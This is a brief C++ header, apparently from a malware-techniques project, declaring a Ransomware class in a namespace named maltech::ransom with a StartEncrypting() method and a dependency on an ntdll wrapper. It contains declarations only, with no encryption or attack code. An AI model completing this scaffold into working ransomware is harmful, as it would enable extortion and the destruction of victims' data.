#pragma once

#include "../MalwareTechniques/ntdll.h"

#include <Windows.h>


namespace maltech {

    namespace ransom {

        class Ransomware {
        public:
            Ransomware(ntdll::NtDll& ntdll);

            void StartEncrypting();

        private:
            ntdll::NtDll& ntdll_;
        };

    }

}